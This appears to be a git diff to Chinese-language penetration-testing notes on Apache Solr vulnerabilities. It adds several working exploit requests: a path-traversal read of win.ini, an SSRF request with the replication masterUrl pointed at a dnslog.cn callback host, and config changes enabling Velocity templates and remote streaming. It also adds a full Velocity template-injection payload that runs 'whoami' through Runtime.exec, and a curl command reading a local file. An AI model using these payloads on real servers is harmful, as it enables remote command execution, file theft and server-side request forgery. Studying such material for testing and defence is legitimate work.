@@ -6,10 +6,11 @@
 
 官方漏洞说明： https://issues.apache.org/jira/projects/SOLR/issues/SOLR-15718?filter=allopenissues
 
+
 历史漏洞
 |漏洞编号|漏洞类型|影响版本|
 |:----:|:----:|:----:|
-|CVE-2021-27905|SSRF|< 8.8.2 |
+|CVE-2021-27905|SSRF|<= 7.7.3, 8.8.1 |
 |CVE-2020-13957|RCE|<= 6.6.6、7.7.3、8.6.2 |
 |CVE-2019-17558|RCE| 5.0.0-8.3.1|
 |CVE-2019-0193|RCE|< 8.2.0|
@@ -41,8 +42,19 @@ solr.cmd create -c solr_sample
 solr.cmd delete -c solr_sample
 ```
 
+常用API
+```
+查看核心
+/solr/admin/cores?indexInfo=false&wt=json
+查看某一核心的配置
+/solr/[core]/config
+
+```
+
 ## CVE-2017-3163
-问题出现在索引复制功能（Replication），Apache Solr节点会从master/leader节点通过文件名拉取文件。但是并没有对文件名进行校验，就造成了任意文件读取。测试数据中自带的核心包含db、mail、rss、solr、tika，以db核心的Replication功能为例的POC如下
+问题出现在索引复制功能（Replication），Apache Solr节点会从master/leader节点通过文件名拉取文件。但是并没有对文件名进行校验，就造成了任意文件读取。测试数据中自带的核心包含db、mail、rss、solr、tika
+
+以db核心的Replication功能为例的POC如下
 ```
 GET /solr/db/replication?command=filecontent&file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fwin.ini&wt=filestream&generation=1
 ```
@@ -109,6 +121,10 @@ NamedList getLatestVersion() throws IOException {
     } ...
   }
 ```
+POC
+```
+GET /solr/db/replication?command=fetchindex&masterUrl=http://xxx.dnslog.cn/xxxx&wt=json&httpBasicAuthUser=aaa&httpBasicAuthPassword=bbb HTTP/1.1
+```
 
 ## CVE-2017-12629
 XML有很多解析方式，包括DOM、SAX、JDO、DOM4J等技术。其中DOM最常用的解析方式如下。如果可以引用外部实体，就会造成XXE漏洞。所以一般的防御方式是在代码中加入`factory.setExpandEntityReferences(false);`来禁用外部实体。
@@ -149,7 +165,52 @@ public DIHConfiguration loadDataConfig(InputSource configFile) {
 ```
 
 
+## CVE-2019-17558
+查看某一核心的solrconfig.xml配置文件，有如下配置。QueryResponseWriter是Solr插件，可以定义任何请求的响应格式。
+```
+<queryResponseWriter name="velocity" class="solr.VelocityResponseWriter" startup="lazy">
+    <str name="template.base.dir">${velocity.template.base.dir:}</str>
+</queryResponseWriter>
+```
+2Apache Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的params.resource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模版，默认设置是false。
+通过请求开启`params.resource.loader.enabled`（此配置默认为false，即默认不允许加载器指定模板），否则模版执行会报错`unable to find resource 'custom.vm'`
+```
+POST /solr/db/config HTTP/1.1
+Content-Type: application/json
+
+{
+  "update-queryresponsewriter": {
+    "startup": "lazy",
+    "name": "velocity",
+    "class": "solr.VelocityResponseWriter",
+    "template.base.dir": "",
+    "solr.resource.loader.enabled": "true",
+    "params.resource.loader.enabled": "true"
+  }
+}
+```
+SSTI命令执行+回显payload
+```
+GET /solr/db/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end
+```
+
+
+## 任意文件读取
+首先修改配置
+```
+POST /solr/db/config HTTP/1.1
+Content-Type: application/json
+
+{  "set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
+```
+读取文件
+```
+curl "http://172.16.165.146:8983/solr/db/debug/dump?param=ContentStreams" -F "stream.url=file:///C:/Windows/win.ini"
+```
+
+
 ## Solr资料
 https://github.com/veracode-research/solr-injection
+
 https://raw.githubusercontent.com/artsploit/solr-injection/master/slides/DEFCON-27-Michael-Stepankin-Apache-Solr-Injection.pdf
 
